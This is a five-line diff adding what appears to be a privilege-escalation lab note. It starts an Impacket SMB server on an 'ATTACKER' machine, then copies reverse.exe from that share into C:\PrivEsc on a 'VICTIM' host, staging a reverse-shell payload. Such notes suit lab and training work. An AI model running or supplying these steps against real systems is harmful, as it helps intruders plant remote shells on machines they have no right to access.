@@ -1,0 +1,5 @@
+ATTACKER
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+VICTIM
+copy \\<ATTACKER>\kali\reverse.exe C:\PrivEsc\reverse.exe
